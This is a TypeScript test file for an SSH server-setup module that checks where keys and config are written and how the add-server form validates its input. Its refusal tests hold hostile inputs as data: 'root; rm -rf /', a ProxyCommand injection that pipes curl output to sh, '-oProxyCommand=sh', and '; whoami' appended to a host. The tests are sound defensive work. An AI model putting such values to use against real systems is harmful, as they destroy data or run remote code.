import { describe, expect, it } from "bun:test";
import { createHash } from "node:crypto";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import {
  addServer,
  pinFingerprint,
  removeServer,
  SetupError,
  sharesAddress,
  untrustHost,
} from "../server-setup";
import {
  appSshPaths,
  renderSshConfig,
  type SshPaths,
  writeSshConfig,
} from "../ssh-config";

const SYSTEM_CONFIG = `Host dev-vps
  HostName 198.51.100.7
  User dev
  IdentityFile ~/.ssh/id_ed25519
`;

function hash(file: string): string {
  return createHash("sha256").update(readFileSync(file)).digest("hex");
}

function fakeHome(): { home: string; sshConfig: string } {
  const home = mkdtempSync(join(tmpdir(), "pupitre-home-"));
  const dir = join(home, ".ssh");

  mkdirSync(dir, { mode: 0o700, recursive: true });

  const sshConfig = join(dir, "config");

  writeFileSync(sshConfig, SYSTEM_CONFIG, { mode: 0o600 });

  return { home, sshConfig };
}

function userData(): string {
  return mkdtempSync(join(tmpdir(), "pupitre-userdata-"));
}

/** A home inside the folder under test: the link lands there, not in the developer's. */
function pathsIn(data: string): SshPaths {
  return appSshPaths(data, join(data, "home"));
}

describe("the add-a-server flow", () => {
  it("never modifies the user's ~/.ssh/config", async () => {
    const { sshConfig } = fakeHome();
    const paths = pathsIn(userData());
    const before = hash(sshConfig);
    const userBefore = existsSync(join(homedir(), ".ssh", "config"))
      ? hash(join(homedir(), ".ssh", "config"))
      : null;

    const created = await addServer(
      {
        host: "203.0.113.10",
        key: { mode: "generate" },
        name: "Staging",
        port: 22,
        user: "root",
      },
      [],
      paths
    );

    writeSshConfig(created.servers, paths);

    const pinned = pinFingerprint(
      created.servers,
      created.server.id,
      "SHA256:x"
    );

    writeSshConfig(pinned, paths);
    await untrustHost(created.server, paths);

    const left = removeServer(pinned, created.server.id, paths);

    writeSshConfig(left, paths);

    expect(hash(sshConfig)).toBe(before);
    expect(
      existsSync(join(homedir(), ".ssh", "config"))
        ? hash(join(homedir(), ".ssh", "config"))
        : null
    ).toBe(userBefore);
    expect(readFileSync(sshConfig, "utf8")).toBe(SYSTEM_CONFIG);
  });

  it("writes everything it writes into the app's data folder", async () => {
    const data = userData();
    const paths = pathsIn(data);

    const created = await addServer(
      {
        host: "203.0.113.10",
        key: { mode: "generate" },
        name: "Staging",
        port: 2222,
        user: "root",
      },
      [],
      paths
    );
    writeSshConfig(created.servers, paths);

    expect(created.server.keyPath?.startsWith(data)).toBe(true);
    expect(paths.configPath.startsWith(data)).toBe(true);
    expect(paths.knownHostsPath.startsWith(data)).toBe(true);
    expect(statSync(created.server.keyPath ?? "").mode & 0o777).toBe(0o600);
  });

  it("keeps the public key within reach, with its ssh-copy-id command", async () => {
    const paths = pathsIn(userData());

    const created = await addServer(
      {
        host: "203.0.113.10",
        key: { mode: "generate" },
        name: "Staging",
        port: 22,
        user: "root",
      },
      [],
      paths
    );

    expect(created.publicKey?.startsWith("ssh-ed25519 ")).toBe(true);
    expect(created.copyId).toContain("ssh-copy-id -i ");
    expect(created.copyId).toContain("root@203.0.113.10");
  });
});

describe("a host already declared in the system", () => {
  it("opens no key or configuration block: the app writes nothing for it", async () => {
    const paths = pathsIn(userData());

    const created = await addServer(
      {
        host: "dev-vps",
        key: { host: "dev-vps", mode: "system" },
        name: "Poste",
        port: 22,
        user: "",
      },
      [],
      paths
    );
    writeSshConfig(created.servers, paths);

    expect(created.server.origin).toBe("system");
    expect(created.server.keyPath).toBeUndefined();
    expect(created.publicKey).toBe(null);
    expect(readFileSync(paths.configPath, "utf8")).not.toContain("dev-vps");
  });
});

describe("the SSH name of an added server", () => {
  const draft = {
    host: "203.0.113.10",
    key: { mode: "generate" } as const,
    name: "Atelier d'Été",
    port: 22,
    user: "root",
  };

  it("is the typed word, formatted for a Host line", async () => {
    const paths = pathsIn(userData());

    const created = await addServer({ ...draft, slug: "Prod VPS" }, [], paths);

    expect(created.server.slug).toBe("prod-vps");
    expect(renderSshConfig(created.servers, paths)).toContain(
      `Host pupitre-${created.server.id} prod-vps\n`
    );
  });

  it("comes from the name when nothing is typed, and is missing when that word is taken", async () => {
    const paths = pathsIn(userData());

    const first = await addServer(draft, [], paths);
    const second = await addServer(draft, first.servers, paths);
    const third = await addServer(
      { ...draft, name: "Bastion" },
      second.servers,
      paths,
      ["bastion"]
    );

    expect(first.server.slug).toBe("atelier-d-ete");
    expect(second.server.slug).toBeUndefined();
    expect(third.server.slug).toBeUndefined();
  });

  it("refuses a typed word that does not hold up, or that already names a machine", async () => {
    const paths = pathsIn(userData());
    const held = await addServer({ ...draft, slug: "atelier" }, [], paths);

    await expect(
      addServer({ ...draft, slug: "···" }, [], paths)
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.sshName" } });
    await expect(
      addServer({ ...draft, slug: "atelier" }, held.servers, paths)
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.sshNameTaken" } });
    await expect(
      addServer({ ...draft, slug: "bastion" }, [], paths, ["bastion"])
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.sshNameTaken" } });
  });

  it("gives none to a system host, which is its own alias", async () => {
    const paths = pathsIn(userData());

    const created = await addServer(
      { ...draft, key: { host: "dev-vps", mode: "system" }, slug: "vps" },
      [],
      paths
    );

    expect(created.server.slug).toBeUndefined();
  });
});

describe("what the form refuses", () => {
  it("says what is wrong with the address, the port and the user", async () => {
    const paths = pathsIn(userData());
    const draft = {
      host: "203.0.113.10",
      key: { mode: "generate" } as const,
      name: "Staging",
      port: 22,
      user: "root",
    };

    expect(addServer({ ...draft, host: "" }, [], paths)).rejects.toBeInstanceOf(
      SetupError
    );
    expect(addServer({ ...draft, port: 0 }, [], paths)).rejects.toBeInstanceOf(
      SetupError
    );
    expect(
      addServer({ ...draft, user: "root; rm -rf /" }, [], paths)
    ).rejects.toBeInstanceOf(SetupError);
  });

  it("refuses an address or account that would add an SSH directive", async () => {
    const paths = pathsIn(userData());
    const injection = "x\nProxyCommand curl a.bc|sh";
    const draft = {
      host: "203.0.113.10",
      key: { mode: "generate" } as const,
      name: "Staging",
      port: 22,
      user: "root",
    };

    await expect(
      addServer({ ...draft, user: injection }, [], paths)
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.user" } });
    await expect(
      addServer({ ...draft, host: injection }, [], paths)
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
    await expect(
      addServer({ ...draft, host: "-oProxyCommand=sh" }, [], paths)
    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
  });

  it("accepts an IPv6 address", async () => {
    const paths = pathsIn(userData());
    const created = await addServer(
      {
        host: "2001:db8::10",
        key: { mode: "generate" },
        name: "Staging",
        port: 22,
        user: "root",
      },
      [],
      paths
    );

    expect(renderSshConfig(created.servers, paths)).toContain(
      "  HostName 2001:db8::10"
    );
  });

  it("carries a fix with its refusal", async () => {
    const paths = pathsIn(userData());

    try {
      await addServer(
        {
          host: "203.0.113.10 ; whoami",
          key: { mode: "generate" },
          name: "Staging",
          port: 22,
          user: "root",
        },
        [],
        paths
      );
      throw new Error("attendu : un refus");
    } catch (error) {
      expect(error).toBeInstanceOf(SetupError);
      expect((error as SetupError).phrase.id).toStartWith("refusal.");
    }
  });
});

describe("removing a server", () => {
  it("takes the key out of the app folder", async () => {
    const paths = pathsIn(userData());
    const created = await addServer(
      {
        host: "203.0.113.10",
        key: { mode: "generate" },
        name: "Staging",
        port: 22,
        user: "root",
      },
      [],
      paths
    );
    const keyPath = created.server.keyPath ?? "";

    const left = removeServer(created.servers, created.server.id, paths);

    expect(left).toEqual([]);
    expect(existsSync(keyPath)).toBe(false);
  });
});

describe("the address a pin belongs to", () => {
  const atelier = {
    host: "203.0.113.10",
    id: "srv-a",
    name: "Atelier",
    origin: "app" as const,
    port: 22,
    user: "root",
  };

  it("is shared by another app server at the same host and port", () => {
    const twin = { ...atelier, id: "srv-b", user: "dev" };

    expect(sharesAddress([atelier, twin], atelier, "srv-a")).toBe(true);
    expect(sharesAddress([atelier], atelier, "srv-a")).toBe(false);
    expect(
      sharesAddress([atelier, { ...twin, port: 2222 }], atelier, "srv-a")
    ).toBe(false);
  });

  it("does not count a system host, for which the app pins nothing", () => {
    const declared = { ...atelier, id: "srv-c", origin: "system" as const };

    expect(sharesAddress([declared], atelier)).toBe(false);
  });
});
